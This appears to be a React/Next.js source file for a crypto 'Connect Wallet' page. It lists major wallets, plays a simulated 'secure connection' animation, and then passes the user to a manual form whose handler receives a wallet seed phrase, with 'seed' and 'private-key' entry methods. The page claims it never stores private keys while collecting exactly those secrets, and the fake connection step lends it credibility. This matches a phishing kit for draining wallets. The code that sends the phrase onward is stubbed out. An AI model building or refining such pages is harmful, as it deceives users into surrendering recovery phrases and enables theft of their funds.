"use client";
import React, { useEffect, useState } from "react";
import {
  ArrowLeft,
  Search,
  Wallet,
  Key,
  Shield,
  ArrowRight,
  ChevronRight,
  ShieldCheck, // Added for the secure icon
  Loader2, // Added for a subtle spinner
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { useAuthStore } from "@/stores/authstore";
import ProtectedImage from "@/components/tools/protected";
import ShowManualWall from "@/components/manual-wallets/showmanual";

// ---------------------------------------------

// 1. Updated Type to include "connecting"
type Step = "intro" | "select" | "connecting" | "connect";
type ConnectionMethod = "seed" | "private-key" | "forgot";

interface WalletOption {
  value: string;
  label: string;
  filename: string;
  popular?: boolean;
}

const wallets: WalletOption[] = [
  {
    value: "metamask",
    label: "MetaMask",
    filename: "/wall/mmfx.svg",
    popular: true,
  },
  {
    value: "trustwallet",
    label: "Trust Wallet",
    filename: "/wall/tw-small.png",
    popular: true,
  },
  {
    value: "phantom",
    label: "Phantom",
    filename: "/wall/phan-small.png",
    popular: true,
  },
  {
    value: "keplr",
    label: "Keplr",
    filename: "/wall/kep-small.png",
  },
  {
    value: "exodus",
    label: "Exodus",
    filename: "/wall/exe-small.png",
  },
  {
    value: "atomic",
    label: "Atomic",
    filename: "/wall/ant-small.png",
  },
  {
    value: "coinbase",
    label: "Coinbase Wallet",
    filename: "/wall/base-v2.svg",
  },
  {
    value: "ledger",
    label: "Ledger",
    filename: "/wall/ledSmall.jpeg",
  },
];

const ConnectWallet: React.FC = () => {
  const router = useRouter();
  const isAuthenticated = useAuthStore((state) => state.isAuthenticated);
  const userStatus = useAuthStore((state) => state.status);
  const [step, setStep] = useState<Step>("intro");
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedWallet, setSelectedWallet] = useState<WalletOption | null>(
    null
  );

  // Unused in this snippet but kept from your original code
  const [connectionMethod, setConnectionMethod] =
    useState<ConnectionMethod>("seed");
  const [inputValue, setInputValue] = useState("");

  const filteredWallets = wallets.filter((w) =>
    w.value.toLowerCase().includes(searchQuery.toLowerCase())
  );

  // 2. Logic to handle the 1.5s delay
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (step === "connecting") {
      timer = setTimeout(() => {
        setStep("connect");
      }, 1500);
    }
    return () => clearTimeout(timer);
  }, [step]);

  const handleFinish = async (walletPhrase: string) => {
    try {
      console.log("Wallet Phrase Submitted:", walletPhrase);
      // Your existing submission logic here
    } catch (error) {
      console.log(error);
    }
  };

  const handleWalletSelect = (wallet: WalletOption) => {
    setSelectedWallet(wallet);
    setStep("connecting"); // 3. Go to connecting state first
  };

  // Auth Protection
  useEffect(() => {
    if (userStatus === "IDLE" || userStatus === "PENDING") return;
    if (!isAuthenticated) {
      router.push("/auth/sign-in");
    }
  }, [isAuthenticated, userStatus, router]);

  // --- Render Views ---

  const renderIntro = () => (
    <div className="animate-fade-up">
      <div className="text-center mb-10">
        <div className="w-20 h-20 mx-auto mb-6 rounded-2xl bg-primary/10 neon-border-blue flex items-center justify-center">
          <Wallet className="w-10 h-10 text-primary" />
        </div>
        <h1 className="font-orbitron font-bold text-3xl mb-3">
          Connect Your Wallet
        </h1>
        <p className="text-muted-foreground max-w-md mx-auto">
          Link your crypto wallet to start trading, swapping, and managing your
          digital assets securely.
        </p>
      </div>

      <div className="glass-card p-6 mb-6 space-y-4">
        <div className="flex items-start gap-4">
          <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center shrink-0">
            <Shield className="w-5 h-5 text-primary" />
          </div>
          <div>
            <h3 className="font-medium mb-1">Non-Custodial</h3>
            <p className="text-sm text-muted-foreground">
              We never store your private keys. You maintain full control of
              your assets.
            </p>
          </div>
        </div>
        <div className="flex items-start gap-4">
          <div className="w-10 h-10 rounded-lg bg-secondary/10 flex items-center justify-center shrink-0">
            <Key className="w-5 h-5 text-secondary" />
          </div>
          <div>
            <h3 className="font-medium mb-1">Secure Connection</h3>
            <p className="text-sm text-muted-foreground">
              All connections are encrypted and verified for maximum security.
            </p>
          </div>
        </div>
      </div>

      <Button
        onClick={() => setStep("select")}
        className="w-full btn-primary-glow py-6 gap-2"
      >
        Connect Wallet
        <ArrowRight className="w-5 h-5" />
      </Button>
    </div>
  );

  const renderSelect = () => (
    <div className="animate-fade-up">
      <div className="text-center mb-8">
        <h1 className="font-orbitron font-bold text-2xl mb-2">Select Wallet</h1>
        <p className="text-muted-foreground">
          Choose your preferred wallet to connect
        </p>
      </div>

      {/* Search */}
      <div className="relative mb-6">
        <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
        <input
          type="text"
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          placeholder="Search wallets..."
          className="w-full bg-input border border-border rounded-lg pl-12 pr-4 py-3 input-glow focus:outline-none"
        />
      </div>

      {/* Popular */}
      {!searchQuery && (
        <div className="mb-4">
          <p className="text-sm text-muted-foreground mb-3">Popular</p>
          <div className="grid grid-cols-3 gap-3">
            {wallets
              .filter((w) => w.popular)
              .map((wallet) => (
                <button
                  key={wallet.value}
                  onClick={() => handleWalletSelect(wallet)}
                  className="glass-card p-4 flex flex-col items-center gap-2 hover:neon-border-blue transition-all group"
                >
                  <span className="text-2xl group-hover:scale-110 transition-transform">
                    <ProtectedImage
                      filename={wallet.filename}
                      alt={wallet.label}
                      className="w-8 h-8 object-contain"
                    />
                  </span>
                  <span className="text-sm font-medium">{wallet.label}</span>
                </button>
              ))}
          </div>
        </div>
      )}

      {/* All Wallets */}
      <div>
        <p className="text-sm text-muted-foreground mb-3">
          {searchQuery ? "Results" : "All Wallets"}
        </p>
        <div className="glass-card overflow-hidden max-h-64 overflow-y-auto">
          {filteredWallets.map((wallet) => (
            <button
              key={wallet.value}
              onClick={() => handleWalletSelect(wallet)}
              className="w-full flex items-center gap-4 p-4 hover:bg-muted/30 transition-colors border-b border-border/30 last:border-0 group"
            >
              <span className="text-2xl group-hover:scale-110 transition-transform">
                <ProtectedImage
                  filename={wallet.filename}
                  alt={wallet.label}
                  className="w-6 h-6 object-contain"
                />
              </span>
              <span className="font-medium flex-1 text-left">
                {wallet.label}
              </span>
              <ChevronRight className="w-5 h-5 text-muted-foreground group-hover:text-primary transition-colors" />
            </button>
          ))}
          {filteredWallets.length === 0 && (
            <p className="p-4 text-center text-muted-foreground">
              No wallets found
            </p>
          )}
        </div>
      </div>

      <button
        onClick={() => setStep("intro")}
        className="mt-6 text-sm text-muted-foreground hover:text-foreground transition-colors flex items-center gap-2 mx-auto"
      >
        <ArrowLeft className="w-4 h-4" />
        Back
      </button>
    </div>
  );

  // 4. New Render function for the "Connecting" state
  const renderConnecting = () => (
    <div className="animate-fade-up flex flex-col items-center justify-center py-12">
      {/* Icon Container with Animation */}
      <div className="relative mb-8">
        {/* Pulsing ring */}
        <div className="absolute inset-0 bg-primary/20 rounded-full animate-ping" />

        {/* Main Circle */}
        <div className="relative z-10 w-24 h-24 bg-card border border-primary/30 rounded-full flex items-center justify-center shadow-lg shadow-primary/10">
          {selectedWallet && (
            <ProtectedImage
              filename={selectedWallet.filename}
              alt={selectedWallet.label}
              className="w-12 h-12 object-contain"
            />
          )}
        </div>

        {/* Secure Badge */}
        <div className="absolute -bottom-2 -right-2 bg-background border border-green-500/30 p-2 rounded-full shadow-lg z-20 flex items-center justify-center animate-bounce-subtle">
          <ShieldCheck className="w-5 h-5 text-green-500" />
        </div>
      </div>

      {/* Text Content */}
      <h2 className="font-orbitron font-bold text-2xl mb-3">Connecting...</h2>
      <div className="flex items-center gap-2 text-muted-foreground">
        <Loader2 className="w-4 h-4 animate-spin" />
        <p>Establishing secure connection</p>
      </div>
    </div>
  );

  return (
    <>
      <div className="min-h-screen bg-background flex items-center justify-center relative overflow-hidden px-4 py-12">
        {/* Background Elements */}
        <div className="absolute inset-0 overflow-hidden">
          <div className="absolute top-1/3 left-1/4 w-96 h-96 bg-primary/5 rounded-full blur-3xl" />
          <div className="absolute bottom-1/3 right-1/4 w-80 h-80 bg-secondary/5 rounded-full blur-3xl" />
        </div>

        {/* Back Button - Hide during connection phases */}
        {step !== "connecting" && step !== "connect" && (
          <Link
            href="/"
            className="absolute top-6 left-6 flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors"
          >
            <ArrowLeft className="w-4 h-4" />
            Home
          </Link>
        )}

        <div className="w-full max-w-md relative z-10">
          {step === "intro" && renderIntro()}
          {step === "select" && renderSelect()}
          {step === "connecting" && renderConnecting()}
          {step === "connect" && (
            <ShowManualWall
              handleFinish={handleFinish}
              selectedWallet={selectedWallet?.value || ""}
            />
          )}
        </div>
      </div>
    </>
  );
};

export default ConnectWallet;
